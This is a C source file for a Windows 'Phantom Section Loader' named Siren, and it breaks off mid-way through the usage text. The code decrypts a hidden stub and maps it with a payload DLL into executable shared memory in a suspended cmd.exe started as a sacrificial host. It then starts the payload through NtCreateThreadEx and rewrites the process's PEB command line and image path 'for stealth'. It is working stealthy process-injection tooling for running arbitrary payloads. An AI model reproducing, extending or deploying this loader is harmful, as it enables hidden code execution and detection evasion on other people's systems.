/*
 * siren.c — Phantom Section Loader
 * Author: Rafael Dornelas
 * License: MIT
 */

#include "siren.h"
#include "sr_stub_gen.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

/* ══════════════════════════════════════════════════════════════════════
 * §0  LOGGING — runtime toggleable via -v flag or SIREN_VERBOSE env var
 * ══════════════════════════════════════════════════════════════════════ */

static int g_verbose = 0;

/* Debug log file — always on for troubleshooting */
static FILE *g_logf = NULL;

static void sr_log_init(void)
{
    if (g_logf) return;
    char path[MAX_PATH];
    DWORD plen = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (plen == 0 || plen >= MAX_PATH) {
        strcpy(path, "siren_debug.log");
    } else {
        /* Replace .exe with _debug.log */
        char *dot = strrchr(path, '.');
        if (dot) strcpy(dot, "_debug.log");
        else strcat(path, "_debug.log");
    }
    g_logf = fopen(path, "a");
    if (g_logf) {
        fprintf(g_logf, "\n═══════════════════════════════════════════\n");
        fprintf(g_logf, "Siren debug log — %s\n", __DATE__ " " __TIME__);
        fprintf(g_logf, "═══════════════════════════════════════════\n");
        fflush(g_logf);
    }
}

#define LOG(fmt, ...) do { \
    if (g_verbose) fprintf(stderr, "[siren] " fmt "\n", ##__VA_ARGS__); \
    if (g_logf) { fprintf(g_logf, "[siren] " fmt "\n", ##__VA_ARGS__); fflush(g_logf); } \
} while(0)
#define OK(fmt, ...)  do { \
    if (g_verbose) fprintf(stderr, "[siren:+] " fmt "\n", ##__VA_ARGS__); \
    if (g_logf) { fprintf(g_logf, "[siren:+] " fmt "\n", ##__VA_ARGS__); fflush(g_logf); } \
} while(0)
#define ERR(fmt, ...) do { \
    if (g_verbose) fprintf(stderr, "[siren:!] " fmt "\n", ##__VA_ARGS__); \
    if (g_logf) { fprintf(g_logf, "[siren:!] " fmt "\n", ##__VA_ARGS__); fflush(g_logf); } \
} while(0)

/* ══════════════════════════════════════════════════════════════════════
 * §1  PE VALIDATION
 * ══════════════════════════════════════════════════════════════════════ */

#define SR_PE_DOS_SIG       0x5A4Du
#define SR_PE_NT_SIG        0x00004550u
#define SR_PE_OPT_PE32PLUS  0x020Bu
#define SR_PE_MACHINE_AMD64 0x8664u

#pragma pack(push, 1)
typedef struct { uint16_t e_magic; uint16_t _p[29]; uint32_t e_lfanew; } sr_dos;
typedef struct { uint16_t Machine; uint16_t NumberOfSections;
                 uint32_t _ts; uint32_t _ps; uint32_t _ns;
                 uint16_t SizeOfOptionalHeader; uint16_t _ch; } sr_fhdr;
typedef struct { uint32_t VirtualAddress; uint32_t Size; } sr_ddir;
typedef struct {
    uint16_t Magic; uint8_t _lv[2]; uint32_t _cs[3];
    uint32_t AddressOfEntryPoint; uint32_t BaseOfCode;
    uint64_t ImageBase; uint32_t SectionAlignment; uint32_t FileAlignment;
    uint16_t _ver[8]; uint32_t SizeOfImage; uint32_t SizeOfHeaders;
    uint32_t CheckSum; uint16_t _ss[2]; uint64_t _stack[2]; uint64_t _heap[2];
    uint32_t _lf; uint32_t NumberOfRvaAndSizes;
    sr_ddir DataDirectory[16];
} sr_opt64;
typedef struct { uint32_t Signature; sr_fhdr FileHeader; sr_opt64 OptionalHeader; } sr_nt64;
typedef struct {
    uint8_t Name[8]; uint32_t VirtualSize; uint32_t VirtualAddress;
    uint32_t SizeOfRawData; uint32_t PointerToRawData;
    uint32_t _pr; uint32_t _pl; uint16_t _nr; uint16_t _nl;
    uint32_t Characteristics;
} sr_sec;
typedef struct {
    uint32_t OriginalFirstThunk;
    uint32_t TimeDateStamp;
    uint32_t ForwarderChain;
    uint32_t Name;
    uint32_t FirstThunk;
} sr_imp_desc;
#pragma pack(pop)

static int sr_range_ex(size_t a, size_t b, size_t lim) {
    return b > lim ? 1 : a > lim - b;
}
static int sr_pow2(uint32_t v) { return v != 0 && (v & (v-1)) == 0; }

static siren_status_t sr_pe_validate(const void *buf, size_t sz)
{
    if (!buf || sz < sizeof(sr_dos)) return SIREN_E_PE_TRUNCATED;
    const uint8_t *b = (const uint8_t *)buf;
    const sr_dos *d = (const sr_dos *)b;
    if (d->e_magic != SR_PE_DOS_SIG) return SIREN_E_PE_BAD_DOS;
    uint32_t noff = d->e_lfanew;
    if (sr_range_ex(noff, sizeof(sr_nt64), sz)) return SIREN_E_PE_TRUNCATED;
    const sr_nt64 *nt = (const sr_nt64 *)(b + noff);
    if (nt->Signature != SR_PE_NT_SIG) return SIREN_E_PE_BAD_NT;
    if (nt->FileHeader.Machine != SR_PE_MACHINE_AMD64) return SIREN_E_PE_WRONG_ARCH;
    if (nt->OptionalHeader.Magic != SR_PE_OPT_PE32PLUS) return SIREN_E_PE_WRONG_ARCH;
    if (!sr_pow2(nt->OptionalHeader.SectionAlignment) ||
        !sr_pow2(nt->OptionalHeader.FileAlignment))
        return SIREN_E_PE_BAD_NT;
    uint32_t soff = noff + (uint32_t)offsetof(sr_nt64, OptionalHeader)
                  + nt->FileHeader.SizeOfOptionalHeader;
    uint16_t sc = nt->FileHeader.NumberOfSections;
    if (sc == 0) return SIREN_E_PE_BAD_NT;
    if (sr_range_ex(soff, (size_t)sc * sizeof(sr_sec), sz))
        return SIREN_E_PE_TRUNCATED;
    const sr_sec *secs = (const sr_sec *)(b + soff);
    for (uint16_t i = 0; i < sc; i++) {
        if (secs[i].SizeOfRawData > 0 &&
            (size_t)(secs[i].PointerToRawData + secs[i].SizeOfRawData) > sz)
            return SIREN_E_PE_TRUNCATED;
    }
    return SIREN_OK;
}

/* ══════════════════════════════════════════════════════════════════════
 * §2  STUB DECRYPTION
 * ══════════════════════════════════════════════════════════════════════ */

static void sr_decrypt_blob(unsigned char *out)
{
    uint32_t kf[4] = { SR_CFG_STACK, SR_CFG_HEAP, SR_CFG_ALIGN, SR_CFG_FLAGS };
    unsigned char key[16];
    memcpy(key, kf, 16);
    for (unsigned i = 0; i < SR_BLOB_SIZE; i++) {
        unsigned char k = key[i % 16] ^ ((i * 7 + 3) & 0xFF);
        out[i] = sr_enc[i] ^ k;
    }
    SecureZeroMemory(key, sizeof(key));
    SecureZeroMemory(kf, sizeof(kf));
}

static size_t sr_blob_aligned(void) {
    return (SR_BLOB_SIZE + SR_BLOB_ALIGN - 1u) & ~(SR_BLOB_ALIGN - 1u);
}

/* ══════════════════════════════════════════════════════════════════════
 * §3  SECTION CARRIER (NtCreateSection + NtMapViewOfSection)
 * ══════════════════════════════════════════════════════════════════════ */

#ifndef SEC_COMMIT
#  define SEC_COMMIT 0x8000000
#endif
#define VIEW_UNMAP 2u

typedef LONG (NTAPI *PFN_NtCreateSection)(
    PHANDLE, ACCESS_MASK, void *, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef LONG (NTAPI *PFN_NtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
    PSIZE_T, DWORD, ULONG, ULONG);
typedef LONG (NTAPI *PFN_NtUnmapViewOfSection)(HANDLE, PVOID);
typedef LONG (NTAPI *PFN_NtClose)(HANDLE);
typedef LONG (NTAPI *PFN_NtQueryInformationProcess)(
    HANDLE, ULONG, PVOID, ULONG, PULONG);

static PFN_NtCreateSection             g_NtCreateSection;
static PFN_NtMapViewOfSection          g_NtMapViewOfSection;
static PFN_NtUnmapViewOfSection        g_NtUnmapViewOfSection;
static PFN_NtClose                     g_NtClose;
static PFN_NtQueryInformationProcess   g_NtQueryInformationProcess;
static BOOL                            g_nt_resolved;

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"

static BOOL sr_resolve_nt(void)
{
    if (g_nt_resolved) return TRUE;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;
    g_NtCreateSection      = (PFN_NtCreateSection)
        GetProcAddress(ntdll, "NtCreateSection");
    g_NtMapViewOfSection   = (PFN_NtMapViewOfSection)
        GetProcAddress(ntdll, "NtMapViewOfSection");
    g_NtUnmapViewOfSection = (PFN_NtUnmapViewOfSection)
        GetProcAddress(ntdll, "NtUnmapViewOfSection");
    g_NtClose              = (PFN_NtClose)
        GetProcAddress(ntdll, "NtClose");
    g_NtQueryInformationProcess = (PFN_NtQueryInformationProcess)
        GetProcAddress(ntdll, "NtQueryInformationProcess");
    g_nt_resolved = g_NtCreateSection && g_NtMapViewOfSection &&
                    g_NtUnmapViewOfSection && g_NtClose;
    /* NtQueryInformationProcess is optional — not needed for basic inject */
    return g_nt_resolved;
}

#pragma GCC diagnostic pop

static siren_status_t sr_carrier_map(HANDLE       hProcess,
                                      const void  *pe_bytes,
                                      size_t       pe_size,
                                      void       **out_stub_addr,
                                      void       **out_local_view,
                                      HANDLE      *out_section)
{
    if (!hProcess || !pe_bytes || pe_size == 0 || !out_stub_addr)
        return SIREN_E_NULL_ARG;

    *out_stub_addr = NULL;

    if (!sr_resolve_nt())
        return SIREN_E_CARRIER_ALLOC;

    size_t blob_sz  = sr_blob_aligned();
    size_t total_sz = blob_sz + pe_size;

    HANDLE hSection = NULL;
    LARGE_INTEGER max_size;
    max_size.QuadPart = (LONGLONG)total_sz;

    LOG("Creating section (%zu bytes)...", total_sz);

    LONG status = g_NtCreateSection(
        &hSection, SECTION_ALL_ACCESS, NULL, &max_size,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    if (status < 0 || !hSection) {
        ERR("NtCreateSection failed: 0x%08X", (unsigned)status);
        return SIREN_E_CARRIER_ALLOC;
    }

    PVOID  local_view = NULL;
    SIZE_T view_sz    = 0;

    status = g_NtMapViewOfSection(
        hSection, GetCurrentProcess(), &local_view,
        0, 0, NULL, &view_sz, VIEW_UNMAP, 0, PAGE_READWRITE);

    if (status < 0 || !local_view) {
        ERR("NtMapViewOfSection(local) failed: 0x%08X", (unsigned)status);
        g_NtClose(hSection);
        return SIREN_E_CARRIER_MAP;
    }

    unsigned char *base = (unsigned char *)local_view;
    memset(base, 0, blob_sz);

    unsigned char stub_plain[SR_BLOB_SIZE];
    sr_decrypt_blob(stub_plain);
    memcpy(base, stub_plain, SR_BLOB_SIZE);
    SecureZeroMemory(stub_plain, sizeof(stub_plain));

    uint32_t offset32 = (uint32_t)blob_sz;
    memcpy(base + SR_BLOB_PATCH, &offset32, sizeof(offset32));

    memcpy(base + blob_sz, pe_bytes, pe_size);

    OK("Stub + payload written to local view @ %p", local_view);

    PVOID  target_base    = NULL;
    SIZE_T target_view_sz = 0;

    status = g_NtMapViewOfSection(
        hSection, hProcess, &target_base,
        0, 0, NULL, &target_view_sz, VIEW_UNMAP, 0, PAGE_EXECUTE_READWRITE);

    if (status < 0 || !target_base) {
        ERR("NtMapViewOfSection(target) failed: 0x%08X", (unsigned)status);
        g_NtUnmapViewOfSection(GetCurrentProcess(), local_view);
        g_NtClose(hSection);
        return SIREN_E_CARRIER_MAP;
    }

    OK("Section mapped into target @ %p", target_base);

    *out_stub_addr  = target_base;
    *out_local_view = local_view;
    *out_section    = hSection;
    return SIREN_OK;
}

/* ══════════════════════════════════════════════════════════════════════
 * §4  PUBLIC API
 * ══════════════════════════════════════════════════════════════════════ */

siren_status_t siren_inject(HANDLE                hProcess,
                            const void           *pe_bytes,
                            size_t                pe_size,
                            siren_inject_options *opts)
{
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE)
        return SIREN_E_NULL_ARG;
    if (!pe_bytes || pe_size < sizeof(sr_dos))
        return SIREN_E_BAD_SIZE;

    siren_status_t r = sr_pe_validate(pe_bytes, pe_size);
    if (SIREN_FAILED(r)) {
        ERR("PE validation failed: 0x%08X", (unsigned)r);
        return r;
    }

    /* Log PE details for debugging */
    {
        const uint8_t *b = (const uint8_t *)pe_bytes;
        uint32_t nt_off;
        memcpy(&nt_off, b + 0x3C, 4);
        uint16_t machine;
        memcpy(&machine, b + nt_off + 4, 2);
        uint16_t nsec;
        memcpy(&nsec, b + nt_off + 6, 2);
        uint32_t entry_rva;
        memcpy(&entry_rva, b + nt_off + 0x28, 4);
        uint32_t img_size;
        memcpy(&img_size, b + nt_off + 0x70, 4);
        LOG("PE details: machine=0x%04X, sections=%u, entry=0x%X, img_size=%u",
            machine, nsec, entry_rva, img_size);
    }

    OK("PE validated (%zu bytes, x86-64)", pe_size);

    void  *stub_addr  = NULL;
    void  *local_view = NULL;
    HANDLE hSection   = NULL;
    r = sr_carrier_map(hProcess, pe_bytes, pe_size, &stub_addr, &local_view, &hSection);
    if (SIREN_FAILED(r)) return r;

    if (opts) {
        opts->out_stub_addr       = stub_addr;
        opts->out_entry_offset    = SR_BLOB_ENTRY;
        opts->out_local_view      = local_view;
        opts->out_section         = hSection;
        opts->out_progress_offset = SR_BLOB_PROGRESS;
    }
    return SIREN_OK;
}

/* ══════════════════════════════════════════════════════════════════════
 * §5  FILE I/O
 * ══════════════════════════════════════════════════════════════════════ */

static void *read_file(const char *path, size_t *out_size)
{
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        ERR("Cannot open '%s'", path);
        return NULL;
    }

    LARGE_INTEGER li;
    if (!GetFileSizeEx(hf, &li) || li.QuadPart == 0 || li.QuadPart > 64*1024*1024) {
        ERR("Invalid file size for '%s'", path);
        CloseHandle(hf);
        return NULL;
    }

    void *buf = malloc((size_t)li.QuadPart);
    if (!buf) { CloseHandle(hf); return NULL; }

    DWORD nread = 0;
    if (!ReadFile(hf, buf, (DWORD)li.QuadPart, &nread, NULL) ||
        nread != (DWORD)li.QuadPart) {
        ERR("ReadFile failed for '%s'", path);
        free(buf);
        CloseHandle(hf);
        return NULL;
    }

    CloseHandle(hf);
    *out_size = (size_t)nread;
    LOG("Read %zu bytes from '%s'", *out_size, path);
    return buf;
}

/* ══════════════════════════════════════════════════════════════════════
 * §6  IMPORT PRE-LOADER & IAT RESOLVER
 * ══════════════════════════════════════════════════════════════════════ */

typedef LONG (NTAPI *PFN_NtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

static uint32_t rva_to_foff(const unsigned char *b, size_t pe_sz,
                             uint32_t nt_off, uint32_t rva)
{
    uint16_t nsec, optsz;
    memcpy(&nsec,  b + nt_off + 0x06, 2);
    memcpy(&optsz, b + nt_off + 0x14, 2);
    uint32_t shdr = nt_off + 0x18 + optsz;
    for (uint16_t i = 0; i < nsec; i++, shdr += 40) {
        if (shdr + 40 > (uint32_t)pe_sz) break;
        uint32_t vsz, va, rawsz, rawoff;
        memcpy(&vsz,    b + shdr + 0x08, 4);
        memcpy(&va,     b + shdr + 0x0C, 4);
        memcpy(&rawsz,  b + shdr + 0x10, 4);
        memcpy(&rawoff, b + shdr + 0x14, 4);
        uint32_t span = vsz ? vsz : rawsz;
        if (rva >= va && rva < va + span) {
            uint32_t off = rawoff + (rva - va);
            return (off + 1 <= (uint32_t)pe_sz) ? off : 0;
        }
    }
    return 0;
}

static void preload_imports(const void *pe, size_t pe_sz,
                            HANDLE hProcess,
                            void *local_view,
                            const void *remote_base,
                            PFN_NtCreateThreadEx pfnNtEx)
{
    const unsigned char *b = (const unsigned char *)pe;
    if (pe_sz < 0xA0) return;

    uint32_t nt_off;
    memcpy(&nt_off, b + 0x3C, 4);
    if ((uint64_t)nt_off + 0xA0 > pe_sz) return;

    uint32_t imp_rva;
    memcpy(&imp_rva, b + nt_off + 0x90, 4);
    if (!imp_rva) return;

    uint32_t imp_foff = rva_to_foff(b, pe_sz, nt_off, imp_rva);
    if (!imp_foff) return;

    FARPROC pfnLoadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pfnLoadLib)
        pfnLoadLib = GetProcAddress(GetModuleHandleA("kernelbase.dll"), "LoadLibraryA");
    if (!pfnLoadLib) return;

    unsigned char *name_buf    = (unsigned char *)local_view  + SR_BLOB_SIZE;
    const char    *name_remote = (const char *)remote_base    + SR_BLOB_SIZE;
    size_t gap  = SR_BLOB_ALIGN - SR_BLOB_SIZE;
    size_t boff = 0;

    const sr_imp_desc *d = (const sr_imp_desc *)(b + imp_foff);
    while ((const unsigned char *)(d + 1) <= b + pe_sz) {
        if (!d->Name) break;

        uint32_t nfoff = rva_to_foff(b, pe_sz, nt_off, d->Name);
        if (!nfoff) { d++; continue; }

        const char *dll_name = (const char *)(b + nfoff);
        size_t nlen = 0;
        while (nlen < 260 && dll_name[nlen]) nlen++;
        if (!nlen || nlen == 260 || boff + nlen + 1 > gap) { d++; continue; }

        memcpy(name_buf + boff, dll_name, nlen + 1);
        void *rname = (void *)((const char *)name_remote + boff);
        boff += nlen + 1;

        HANDLE ht = NULL;
        LONG st = pfnNtEx(&ht, THREAD_ALL_ACCESS, NULL,
                          hProcess, (PVOID)pfnLoadLib, rname,
                          0, 0, 0, 0, NULL);
        if (st >= 0 && ht) {
            WaitForSingleObject(ht, 5000);
            CloseHandle(ht);
            LOG("Pre-loaded dependency: %s", dll_name);
        }
        d++;
    }
}

static void resolve_iat(const void *pe, size_t pe_sz,
                        void *local_view,
                        size_t blob_off,
                        size_t progress_off)
{
    const unsigned char *b  = (const unsigned char *)pe;
    unsigned char *lv_pe    = (unsigned char *)local_view + blob_off;

    uint32_t nt_off;
    memcpy(&nt_off, b + 0x3C, 4);
    if ((uint64_t)nt_off + 0xA0 > pe_sz) return;

    uint32_t imp_rva;
    memcpy(&imp_rva, b + nt_off + 0x90, 4);
    if (!imp_rva) return;

    uint32_t imp_foff = rva_to_foff(b, pe_sz, nt_off, imp_rva);
    if (!imp_foff) return;

    const sr_imp_desc *d = (const sr_imp_desc *)(b + imp_foff);

    while ((const unsigned char *)(d + 1) <= b + pe_sz) {
        if (!d->Name) break;

        uint32_t nfoff = rva_to_foff(b, pe_sz, nt_off, d->Name);
        if (!nfoff) { d++; continue; }
        const char *dll_name = (const char *)(b + nfoff);

        HMODULE hMod = GetModuleHandleA(dll_name);
        if (!hMod) hMod = LoadLibraryA(dll_name);
        if (!hMod) { d++; continue; }

        uint32_t ilt_rva = d->OriginalFirstThunk ? d->OriginalFirstThunk
                                                  : d->FirstThunk;
        uint32_t iat_rva = d->FirstThunk;

        uint32_t ilt_foff = rva_to_foff(b, pe_sz, nt_off, ilt_rva);
        uint32_t iat_foff = rva_to_foff(b, pe_sz, nt_off, iat_rva);
        if (!ilt_foff || !iat_foff) { d++; continue; }

        const unsigned char *ilt = b + ilt_foff;
        unsigned char       *iat = lv_pe + iat_foff;

        while (ilt + 8 <= b + pe_sz) {
            uint64_t thunk;
            memcpy(&thunk, ilt, 8);
            if (!thunk) break;

            FARPROC fn = NULL;
            if (thunk >> 63) {
                fn = GetProcAddress(hMod, MAKEINTRESOURCEA((WORD)(thunk & 0xFFFF)));
            } else {
                uint32_t ibn_rva  = (uint32_t)(thunk & 0xFFFFFFFF);
                uint32_t ibn_foff = rva_to_foff(b, pe_sz, nt_off, ibn_rva);
                if (ibn_foff + 2 < pe_sz)
                    fn = GetProcAddress(hMod, (const char *)(b + ibn_foff + 2));
            }

            uint64_t va = fn ? (uint64_t)(uintptr_t)fn : 0ULL;
            memcpy(iat, &va, 8);
            ilt += 8;
            iat += 8;
        }
        d++;
    }

    /* DO NOT set skip flag - stub must resolve API sets (api-ms-win-*) itself */
    LOG("IAT partially written (stub will resolve in-target)");
}

/* ══════════════════════════════════════════════════════════════════════
 * §6.5  PEB PATCHING — fix process parameters for stealth
 * ══════════════════════════════════════════════════════════════════════ */

#define SR_PEB_PP_OFF        0x20u
#define SR_RUPP_IMGPATH_OFF  0x60u
#define SR_RUPP_CMDLINE_OFF  0x70u

typedef struct {
    USHORT Length;
    USHORT MaxLength;
    PVOID  Buffer;
} SR_UNICODE_STR;

static void sr_patch_peb_paths(HANDLE hProcess,
                                const wchar_t *host_exe,
                                const wchar_t *host_args)
{
    if (!g_NtQueryInformationProcess || !hProcess) {
        LOG("PEB patch: NtQueryInformationProcess unavailable, skipping");
        return;
    }

    /* NO pragma pack here — PROCESS_BASIC_INFORMATION must have natural
     * alignment (48 bytes on x64). Packing caused 0xC0000004. */
    typedef struct {
        LONG      ExitStatus;
        PVOID     PebBaseAddress;
        ULONG_PTR AffinityMask;
        LONG      BasePriority;
        ULONG_PTR UniqueProcessId;
        ULONG_PTR InheritedFromUniqueProcessId;
    } SR_PROCESS_BASIC_INFO;

    SR_PROCESS_BASIC_INFO pbi;
    memset(&pbi, 0, sizeof(pbi));
    ULONG ret_len = 0;
    LONG st = g_NtQueryInformationProcess(
        hProcess, 0, &pbi, sizeof(pbi), &ret_len);

    if (st < 0 || !pbi.PebBaseAddress) {
        LOG("PEB patch: NtQueryInformationProcess failed (0x%08X)", (unsigned)st);
        return;
    }

    PVOID pp_remote = (char *)pbi.PebBaseAddress + SR_PEB_PP_OFF;
    PVOID process_params = NULL;
    SIZE_T br = 0;
    if (!ReadProcessMemory(hProcess, pp_remote, &process_params,
                           sizeof(process_params), &br) || !process_params) {
        LOG("PEB patch: cannot read ProcessParameters");
        return;
    }

    if (host_args && host_args[0]) {
        size_t args_len = wcslen(host_args);
        size_t buf_sz = (args_len + 1) * sizeof(wchar_t);
        PVOID remote_buf = VirtualAllocEx(hProcess, NULL, buf_sz,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (remote_buf) {
            SIZE_T bw = 0;
            if (WriteProcessMemory(hProcess, remote_buf, host_args, buf_sz, &bw) && bw == buf_sz) {
                SR_UNICODE_STR us;
                us.Length    = (USHORT)(args_len * sizeof(wchar_t));
                us.MaxLength = (USHORT)buf_sz;
                us.Buffer    = remote_buf;
                PVOID cl_remote = (char *)process_params + SR_RUPP_CMDLINE_OFF;
                WriteProcessMemory(hProcess, cl_remote, &us, sizeof(us), &bw);
                LOG("PEB patch: CommandLine rewritten (%zu chars)", args_len);
            }
        }
    }

    if (host_exe && host_exe[0]) {
        wchar_t full_path[MAX_PATH];
        DWORD plen = SearchPathW(NULL, host_exe, NULL, MAX_PATH, full_path, NULL);
        if (plen > 0 && plen < MAX_PATH) {
            size_t path_len = wcslen(full_path);
            size_t buf_sz = (path_len + 1) * sizeof(wchar_t);
            PVOID remote_buf = VirtualAllocEx(hProcess, NULL, buf_sz,
                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (remote_buf) {
                SIZE_T bw = 0;
                if (WriteProcessMemory(hProcess, remote_buf, full_path, buf_sz, &bw) && bw == buf_sz) {
                    SR_UNICODE_STR us;
                    us.Length    = (USHORT)(path_len * sizeof(wchar_t));
                    us.MaxLength = (USHORT)buf_sz;
                    us.Buffer    = remote_buf;
                    PVOID ip_remote = (char *)process_params + SR_RUPP_IMGPATH_OFF;
                    WriteProcessMemory(hProcess, ip_remote, &us, sizeof(us), &bw);
                    LOG("PEB patch: ImagePathName -> %ls", full_path);
                }
            }
        }
    }
    OK("PEB patched for stealth");
}

/* ══════════════════════════════════════════════════════════════════════
 * §7  INJECTION LOGIC
 * ══════════════════════════════════════════════════════════════════════ */

/* Default sacrificial process — stays alive long enough for injection */
#define SR_DEFAULT_HOST L"cmd.exe"
#define SR_DEFAULT_ARGS L"/c ping -t 127.0.0.1 >nul 2>&1"

static BOOL inject_suspended_child(const void *dll_bytes, size_t dll_size,
                                    const wchar_t *host_exe,
                                    const wchar_t *host_args)
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"
    PFN_NtCreateThreadEx pfnNtCreateThreadEx = (PFN_NtCreateThreadEx)
        GetProcAddress(ntdll, "NtCreateThreadEx");
#pragma GCC diagnostic pop

    if (!pfnNtCreateThreadEx) {
        ERR("Cannot resolve NtCreateThreadEx");
        return FALSE;
    }

    /* Build command line */
    wchar_t cmdline[512];
    if (host_args && host_args[0]) {
        _snwprintf(cmdline, 511, L"%s %s", host_exe, host_args);
    } else {
        _snwprintf(cmdline, 511, L"%s", host_exe);
    }

    LOG("Spawning host: %ls", cmdline);

    STARTUPINFOW si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));

    LOG("CreateProcessW: '%ls'", cmdline);

    if (!CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
                        CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi)) {
        ERR("CreateProcessW failed: %lu", GetLastError());
        return FALSE;
    }

    OK("Host spawned (PID=%lu, TID=%lu)", pi.dwProcessId, pi.dwThreadId);

    LOG("Calling siren_inject (%zu bytes)...", dll_size);
    siren_inject_options opts;
    memset(&opts, 0, sizeof(opts));
    siren_status_t r = siren_inject(pi.hProcess, dll_bytes, dll_size, &opts);

    BOOL ok = FALSE;
    if (SIREN_FAILED(r)) {
        ERR("siren_inject failed: 0x%08X", (unsigned)r);
        TerminateProcess(pi.hProcess, 1);
        goto cleanup;
    }

    LOG("inject OK: stub=%p, entry_off=%zu, view=%p",
        opts.out_stub_addr, opts.out_entry_offset, opts.out_local_view);

    LOG("Resuming thread (PID=%lu)...", pi.dwProcessId);
    ResumeThread(pi.hThread);

    LOG("Waiting 3s for loader init...");
    Sleep(3000);

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    LOG("Host exitCode=%lu (STILL_ACTIVE=%lu)", exitCode, (DWORD)STILL_ACTIVE);
    if (exitCode != STILL_ACTIVE) {
        ERR("Host exited prematurely (code=%lu)", exitCode);
        goto cleanup;
    }

    OK("Host alive — preloading imports...");
    preload_imports(dll_bytes, dll_size,
                    pi.hProcess,
                    opts.out_local_view,
                    opts.out_stub_addr,
                    pfnNtCreateThreadEx);
    LOG("preload_imports done");

    LOG("resolve_iat...");
    resolve_iat(dll_bytes, dll_size,
                opts.out_local_view,
                SR_BLOB_ALIGN,
                opts.out_progress_offset);
    LOG("resolve_iat done");

    /* Tell the stub to skip its own import resolution.
     * The injector's resolve_iat uses GetProcAddress which correctly follows
     * PE forwarders (kernel32 -> kernelbase), while the stub's export_lookup
     * rejects forwarders and would overwrite our correctly-resolved IAT
     * entries with NULL, causing STATUS_ACCESS_VIOLATION in DllMain.
     * .Lskip_imports is at .Lprogress + 4 in the stub layout. */
    {
        unsigned char *skip_flag = (unsigned char *)opts.out_local_view
                                   + opts.out_progress_offset + 4;
        *skip_flag = 1;
        LOG("skip_imports flag set (stub will use injector-resolved IAT)");
    }

    LOG("sr_patch_peb_paths...");
    sr_patch_peb_paths(pi.hProcess, host_exe, host_args);
    LOG("PEB patch done");

    if (opts.out_stub_addr) {
        void *entry = (char *)opts.out_stub_addr + opts.out_entry_offset;
        HANDLE hRemote = NULL;
        LOG("SR_BLOB_ENTRY=%zu, SR_BLOB_PROGRESS=%zu, SR_BLOB_PATCH=%zu",
            (size_t)SR_BLOB_ENTRY, (size_t)SR_BLOB_PROGRESS, (size_t)SR_BLOB_PATCH);
        LOG("NtCreateThreadEx: entry=%p (base=%p + %zu)",
            entry, opts.out_stub_addr, opts.out_entry_offset);

        LONG st = pfnNtCreateThreadEx(
            &hRemote, THREAD_ALL_ACCESS, NULL,
            pi.hProcess, entry, NULL,
            0, 0, 0, 0, NULL);

        LOG("NtCreateThreadEx: ret=0x%08X, h=%p", (unsigned)st, hRemote);
        if (st >= 0 && hRemote) {
            LOG("Waiting 2s for stub...");
            DWORD wr = WaitForSingleObject(hRemote, 2000);
            LOG("Stub wait: %lu (0=signaled, 258=timeout)", wr);
            DWORD texit = 0;
            GetExitCodeThread(hRemote, &texit);
            LOG("Stub thread exit: %lu", texit);
            CloseHandle(hRemote);

            /* Check if host is still alive after stub ran */
            GetExitCodeProcess(pi.hProcess, &exitCode);
            LOG("Host exitCode after stub: %lu", exitCode);

            /* Success criteria:
             *   - Host must be STILL_ACTIVE (didn't crash)
             *   - Thread exit must NOT be an NTSTATUS error (>= 0x80000000)
             *     such as 0xC0000005 (ACCESS_VIOLATION). A value of 0 means
             *     clean return; 259 (STILL_ACTIVE) means the thread is still
             *     running (payload active) — both are OK. */
            if (exitCode != STILL_ACTIVE) {
                ERR("Host crashed after stub (code=%lu)", exitCode);
            } else if (texit >= 0x80000000u) {
                ERR("Stub crashed (NTSTATUS=0x%08lX)", texit);
            } else {
                ok = TRUE;
                OK("Injection complete (stub exit=%lu, host alive)", texit);
            }
        } else {
            ERR("NtCreateThreadEx failed: 0x%08X (GLE=%lu)",
                (unsigned)st, GetLastError());
        }
    } else {
        ERR("out_stub_addr is NULL!");
    }

cleanup:
    LOG("Closing handles, returning %s", ok ? "TRUE" : "FALSE");
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return ok;
}

/* ══════════════════════════════════════════════════════════════════════
 * §7.5  HIGH-LEVEL API — one-call injection for library consumers
 * ══════════════════════════════════════════════════════════════════════ */

BOOL siren_inject_bytes(const void *dll_bytes, size_t dll_size,
                        const char *cmdline)
{
    if (!dll_bytes || dll_size == 0) return FALSE;

    const wchar_t *host_exe  = SR_DEFAULT_HOST;
    const wchar_t *host_args = SR_DEFAULT_ARGS;
    wchar_t custom_args[512] = {0};

    if (cmdline && cmdline[0]) {
        MultiByteToWideChar(CP_UTF8, 0, cmdline, -1, custom_args, 511);
        host_args = custom_args;
    }

    return inject_suspended_child(dll_bytes, dll_size, host_exe, host_args);
}

/* ══════════════════════════════════════════════════════════════════════
 * §8  CLI / ENTRY POINT
 * ══════════════════════════════════════════════════════════════════════ */

static void print_usage(const char *prog)
{
    fprintf(stderr,
        "Siren %s — Phantom Section Loader\n"
        "\n"
        "Usage:\n"
        "  %s <payload.dll> [options]\n"
        "\n"
        "Options:\n"
        "  -v, --verbose       Enable verbose logging\n"
